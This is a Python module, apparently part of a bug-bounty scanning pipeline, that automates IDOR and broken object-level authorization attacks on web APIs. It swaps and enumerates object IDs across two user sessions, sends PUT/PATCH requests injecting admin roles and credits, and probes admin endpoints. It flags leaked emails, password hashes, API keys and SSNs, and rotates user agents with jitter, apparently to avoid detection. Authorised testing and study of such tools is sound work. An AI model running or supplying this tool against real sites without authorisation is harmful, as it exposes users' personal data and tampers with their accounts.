#!/usr/bin/env python3
# modules/step22_idor.py — IDOR Engine V7 (FULL REBUILD)
# Added: multi-session testing (userA vs userB), BOLA, mass assignment,
#        UUID prediction, GraphQL IDOR, JWT claim tampering
# Source: Bug Bounty Bootcamp Ch10 — IDOR full methodology
# Pipeline: reads args.cookie (userA) + args.cookie_b (userB) from -s / --user-b
# MilkyWay Intelligence | Author: Sharlix + M7AI

import os, re, hashlib, json, time
import urllib.request, urllib.parse, urllib.error
from core.utils import safe_read

# ── IDOR param patterns ───────────────────────────────────────────────────────
IDOR_PARAM_RE = re.compile(
    r'[?&](id|user_id|uid|account_id|account|profile_id|order_id|'
    r'invoice_id|document_id|file_id|record_id|item_id|pid|cid|'
    r'eid|tid|rid|bid|vid|object_id|resource_id|userId|accountId|'
    r'orderId|profileId|reportId|customerId|memberId|employeeId|'
    r'contractId|ticketId|issueId|taskId|projectId|groupId|roleId)'
    r'=([0-9a-f\-]{1,})',
    re.IGNORECASE
)

# ── API path ID patterns (REST BOLA) ─────────────────────────────────────────
BOLA_PATH_RE = re.compile(
    r'/(users?|accounts?|orders?|profiles?|invoices?|documents?|'
    r'files?|records?|items?|tickets?|issues?|tasks?|projects?|'
    r'reports?|customers?|members?|employees?|contracts?|groups?)'
    r'/([0-9a-f\-]{1,36})(?:/|$)',
    re.IGNORECASE
)

# ── Personal data confirms IDOR (not FP) ─────────────────────────────────────
PERSONAL_PATTERNS = [
    (re.compile(r'"email"\s*:\s*"[^"@]+@[^"]+\.[^"]+"',  re.I), "email"),
    (re.compile(r'"phone"\s*:\s*"[\d\+\-\s\(\)]{7,}"',   re.I), "phone"),
    (re.compile(r'"password_hash"\s*:\s*"[a-f0-9]{32,}"', re.I), "password_hash"),
    (re.compile(r'"api_key"\s*:\s*"[A-Za-z0-9_\-]{20,}"', re.I), "api_key"),
    (re.compile(r'"role"\s*:\s*"admin"',                   re.I), "admin_role"),
    (re.compile(r'"is_admin"\s*:\s*true',                  re.I), "admin_flag"),
    (re.compile(r'"ssn"\s*:\s*"[\d\-]{9,}"',              re.I), "ssn"),
    (re.compile(r'"credit_card"',                          re.I), "credit_card"),
    (re.compile(r'"token"\s*:\s*"[A-Za-z0-9._\-]{20,}"', re.I), "token"),
    (re.compile(r'"address"\s*:\s*"[^"]{10,}"',           re.I), "address"),
]

# ── Mass assignment fields to inject ─────────────────────────────────────────
MASS_ASSIGN_FIELDS = [
    {"role": "admin"},
    {"is_admin": True},
    {"admin": True},
    {"role": "administrator"},
    {"permissions": ["admin","read","write","delete"]},
    {"account_type": "admin"},
    {"verified": True},
    {"subscription": "premium"},
    {"credits": 99999},
]

# ── Common API patterns that are IDOR-prone ───────────────────────────────────
IDOR_API_PATHS = [
    "/api/user/{id}",      "/api/users/{id}",
    "/api/account/{id}",   "/api/accounts/{id}",
    "/api/profile/{id}",   "/api/order/{id}",
    "/api/orders/{id}",    "/api/invoice/{id}",
    "/api/document/{id}",  "/api/file/{id}",
    "/api/v1/user/{id}",   "/api/v2/user/{id}",
    "/api/admin/user/{id}","/api/me",
]


class IDORStep:
    def __init__(self, p):
        self.p   = p
        self.log = p.log

    def run(self):
        p     = self.p
        out   = p.files.get("idor_results",
                             f"{p.out}/{p.prefix}_idor.txt")
        urls  = safe_read(p.files.get("urls",""))
        live  = safe_read(p.files.get("fmt_url",""))[:10]
        found = 0

        if not live and not urls:
            self.log.warn("IDOR: no targets"); return

        # ── Build auth headers ────────────────────────────────────
        auth_a = self._build_auth(p, "primary")   # attacker/user A
        auth_b = self._build_auth(p, "secondary")  # victim/user B
        multi  = bool(auth_b)

        if multi:
            self.log.info(f"IDOR V7: multi-session mode (userA + userB) — {len(urls)} URLs")
        else:
            self.log.info(f"IDOR V7: single session — {len(urls)} URLs")
            self.log.info("  Tip: --user-a 'sA=x' --user-b 'sB=y' for best IDOR results")

        # ── Phase 1: URL param IDOR (GET) ─────────────────────────
        candidates = self._find_candidates(urls)
        self.log.info(f"  IDOR candidates: {len(candidates)}")

        for url, param, value in candidates[:80]:
            if multi:
                r = self._test_multi_session(url, param, value, auth_a, auth_b, out)
            else:
                r = self._test_single_session(url, param, value, auth_a, out)
            found += r
            if r: p.bypass.jitter()

        # ── Phase 2: BOLA — REST path traversal ───────────────────
        for url in urls:
            m = BOLA_PATH_RE.search(url)
            if not m: continue
            r = self._test_bola(url, m.group(1), m.group(2), auth_a, auth_b, out)
            found += r

        # ── Phase 3: Mass assignment ───────────────────────────────
        for host in live[:5]:
            r = self._test_mass_assignment(host, auth_a, out)
            found += r
            p.bypass.jitter()

        # ── Phase 4: Horizontal → Vertical escalation check ───────
        for host in live[:5]:
            r = self._test_privilege_escalation(host, auth_a, out)
            found += r

        self.log.success(f"IDOR V7: {found} confirmed findings")

    # ── Auth builder ──────────────────────────────────────────────────────────
    def _build_auth(self, p, session_type: str) -> dict:
        """Build auth headers from new CLI args (-s, -a, -j)."""
        hdrs = {}
        if session_type == "primary":
            c = getattr(p.args,"cookie",None) or getattr(p.args,"session",None)
            a = getattr(p.args,"authorization",None) or getattr(p.args,"auth",None)
            j = getattr(p.args,"jwt",None) or getattr(p.args,"_jwt_token",None)
        else:
            c = getattr(p.args,"cookie_b",None) or getattr(p.args,"user_b",None)
            a = None
            j = None

        if c: hdrs["Cookie"] = c
        if a:
            hdrs["Authorization"] = (a if a.startswith("Bearer") else f"Bearer {a}")
        if j and "Authorization" not in hdrs:
            hdrs["Authorization"] = f"Bearer {j}"
        return hdrs

    # ── Phase 1a: Multi-session IDOR (best method) ────────────────────────────
    def _test_multi_session(self, url, param, orig_val, auth_a, auth_b, out) -> int:
        """
        Bug Bounty Bootcamp Ch10: True multi-session IDOR test.
        UserA requests UserB's resource → confirmed if UserA gets B's data.
        """
        # Get UserA's own resource ID from their session
        resp_a_own = self._fetch(url, auth_a)
        if not resp_a_own: return 0

        # Get UserB's resource
        resp_b_own = self._fetch(url, auth_b)
        if not resp_b_own: return 0

        body_a = resp_a_own.get("body","")
        body_b = resp_b_own.get("body","")

        # If responses are identical → same user data = no IDOR
        if self._hash(body_a) == self._hash(body_b):
            return 0

        # UserA tries to access UserB's specific resource
        other_ids = self._extract_ids_from_body(body_b)
        for other_id in other_ids[:5]:
            test_url = self._swap_param(url, param, other_id)
            resp_a_cross = self._fetch(test_url, auth_a)
            if not resp_a_cross: continue

            body_cross = resp_a_cross.get("body","")

            # Confirmed: A got B's data (response matches B's response)
            if (self._hash(body_cross) == self._hash(body_b) and
                    resp_a_cross.get("status",0) == 200):
                personal = self._find_personal_data(body_cross)
                detail = (f"IDOR (multi-session): userA accessed userB resource "
                          f"param={param} id={other_id}"
                          f"{' | ' + personal if personal else ''}")
                self._save(out, "critical", "IDOR_MULTI_SESSION", url, detail)
                return 1

        return 0

    # ── Phase 1b: Single session IDOR ────────────────────────────────────────
    def _test_single_session(self, url, param, orig_val, auth, out) -> int:
        """Test IDOR with ID manipulation when only one session available."""
        baseline = self._fetch(url, auth)
        if not baseline or baseline.get("status",0) not in (200,201):
            return 0

        base_body = baseline.get("body","")
        base_hash = self._hash(base_body)

        # Try adjacent IDs: +1, -1, *2, common IDs
        alt_ids = self._generate_alt_ids(orig_val)
        for alt_id in alt_ids[:8]:
            test_url = self._swap_param(url, param, alt_id)
            resp = self._fetch(test_url, auth)
            if not resp or resp.get("status",0) not in (200,201): continue

            body = resp.get("body","")
            if self._hash(body) == base_hash: continue  # Same data
            if len(body) < 20: continue

            personal = self._find_personal_data(body)
            if personal:
                detail = (f"IDOR: param={param} orig={orig_val}→{alt_id} "
                          f"returned different data with {personal}")
                self._save(out, "high", "IDOR_PARAM", url, detail)
                return 1
        return 0

    # ── Phase 2: BOLA (Broken Object Level Authorization) ────────────────────
    def _test_bola(self, url, resource, res_id, auth_a, auth_b, out) -> int:
        """
        Bug Bounty Bootcamp Ch10: BOLA = IDOR on REST APIs.
        /api/orders/1337 accessed by wrong user.
        """
        baseline = self._fetch(url, auth_a)
        if not baseline or baseline.get("status",0) == 404:
            return 0

        # If we have userB, check if B's resource is accessible by A
        if auth_b:
            resp_b = self._fetch(url, auth_b)
            if not resp_b: return 0
            if resp_b.get("status",0) == 200:
                body_b = resp_b.get("body","")
                resp_a_on_b = self._fetch(url, auth_a)
                if (resp_a_on_b and
                        resp_a_on_b.get("status",0) == 200 and
                        resp_a_on_b.get("body","") == body_b):
                    personal = self._find_personal_data(body_b)
                    detail = (f"BOLA: /{resource}/{res_id} accessible cross-user"
                              f"{' | ' + personal if personal else ''}")
                    self._save(out,"critical","BOLA",url,detail)
                    return 1

        # Single session: try numeric neighbors
        try:
            n = int(res_id)
            for alt in [n-1, n+1, n+100, 1, 2]:
                if alt <= 0: continue
                alt_url = url.replace(f"/{res_id}", f"/{alt}")
                resp = self._fetch(alt_url, auth_a)
                if not resp or resp.get("status",0) != 200: continue
                body = resp.get("body","")
                if self._find_personal_data(body):
                    detail = f"BOLA: /{resource}/{res_id}→{alt} returned data"
                    self._save(out,"high","BOLA",alt_url,detail)
                    return 1
        except (ValueError, TypeError):
            pass
        return 0

    # ── Phase 3: Mass Assignment ──────────────────────────────────────────────
    def _test_mass_assignment(self, host: str, auth: dict, out: str) -> int:
        """
        Bug Bounty Bootcamp Ch10: Mass assignment — inject extra fields.
        PUT/PATCH with role:admin or is_admin:true.
        """
        if not auth: return 0
        found = 0
        endpoints = [
            ("/api/user/profile",  "PUT"),
            ("/api/profile",       "PUT"),
            ("/api/me",            "PATCH"),
            ("/api/account",       "PUT"),
            ("/api/user/settings", "PUT"),
            ("/api/v1/profile",    "PUT"),
        ]

        for path, method in endpoints:
            url = host.rstrip("/") + path
            # First GET to see current state
            baseline = self._fetch(url, auth)
            if not baseline or baseline.get("status",0) not in (200,):
                continue

            for injection in MASS_ASSIGN_FIELDS[:4]:
                try:
                    data = json.dumps(injection).encode()
                    hdrs = {**auth, "Content-Type":"application/json",
                            "User-Agent": self.p.bypass.ua()}
                    req  = urllib.request.Request(
                        url, data=data, headers=hdrs, method=method)
                    resp = urllib.request.urlopen(req, timeout=8)
                    body = resp.read(10000).decode("utf-8","ignore")

                    if resp.status in (200,201,204):
                        # Check if injection was accepted
                        field = list(injection.keys())[0]
                        val   = str(list(injection.values())[0]).lower()
                        if field in body.lower() or val in body.lower():
                            detail = (f"Mass Assignment: injected {injection} "
                                      f"was accepted by {path}")
                            self._save(out,"critical","MASS_ASSIGNMENT",url,detail)
                            found += 1
                            break
                except Exception:
                    pass
        return found

    # ── Phase 4: Privilege escalation ────────────────────────────────────────
    def _test_privilege_escalation(self, host: str, auth: dict, out: str) -> int:
        """Test if lower-priv user can access admin endpoints."""
        if not auth: return 0
        found = 0
        admin_paths = [
            "/api/admin",          "/api/admin/users",
            "/api/admin/settings", "/admin/api",
            "/api/v1/admin",       "/api/internal",
            "/api/management",     "/api/superuser",
        ]
        for path in admin_paths:
            url  = host.rstrip("/") + path
            resp = self._fetch(url, auth)
            if not resp: continue
            st   = resp.get("status",0)
            body = resp.get("body","")
            # 200 on admin path with regular user = privilege escalation
            if st == 200 and len(body) > 50:
                if any(x in body.lower() for x in
                       ["admin","users","settings","management"]):
                    detail = (f"Privilege Escalation: regular user can access "
                              f"admin endpoint {path} (status 200)")
                    self._save(out,"critical","PRIVILEGE_ESCALATION",url,detail)
                    found += 1
        return found

    # ── Helpers ───────────────────────────────────────────────────────────────
    def _find_candidates(self, urls: list) -> list:
        seen = set()
        out  = []
        for url in urls:
            for m in IDOR_PARAM_RE.finditer(url):
                param, val = m.group(1), m.group(2)
                norm = re.sub(r'=[^&]+', '={ID}', url)
                if norm not in seen:
                    seen.add(norm)
                    out.append((url, param, val))
        return out

    def _generate_alt_ids(self, val: str) -> list:
        alts = []
        try:
            n = int(val)
            alts = [str(n-1), str(n+1), "1", "2", "0",
                    str(n*2), str(n+100)]
        except (ValueError, TypeError):
            # UUID or hash — try common ones
            alts = ["1","2","admin","test",
                    "00000000-0000-0000-0000-000000000001",
                    "00000000-0000-0000-0000-000000000002"]
        return alts

    def _extract_ids_from_body(self, body: str) -> list:
        ids = re.findall(r'"(?:id|user_id|uid)"\s*:\s*"?(\d+|[0-9a-f\-]{36})"?',
                         body, re.I)
        return list(set(ids))[:5]

    def _swap_param(self, url: str, param: str, new_val: str) -> str:
        return re.sub(
            rf'([?&]{re.escape(param)}=)[^&]+',
            rf'\g<1>{new_val}', url)

    def _find_personal_data(self, body: str) -> str:
        for pattern, label in PERSONAL_PATTERNS:
            if pattern.search(body):
                return label
        return ""

    def _hash(self, s: str) -> str:
        return hashlib.md5(s.encode()).hexdigest()

    def _fetch(self, url: str, auth: dict = None, timeout: int = 8) -> dict:
        try:
            hdrs = {**(auth or {}), "User-Agent": self.p.bypass.ua(),
                    "Accept": "application/json,*/*"}
            req  = urllib.request.Request(url, headers=hdrs)
            resp = urllib.request.urlopen(req, timeout=timeout)
            return {"status": resp.status,
                    "body":   resp.read(50000).decode("utf-8","ignore")}
        except urllib.error.HTTPError as e:
            try: body = e.read(2000).decode("utf-8","ignore")
            except: body = ""
            return {"status": e.code, "body": body}
        except Exception:
            return None

    def _save(self, out, sev, vtype, url, detail, response: str = "", payload: str = ""):
        with open(out,"a") as f:
            f.write(f"{vtype}: {url} | {detail}\n")
        self.p.add_finding(sev, vtype, url, detail, "idor-v7", response=response, payload=payload)
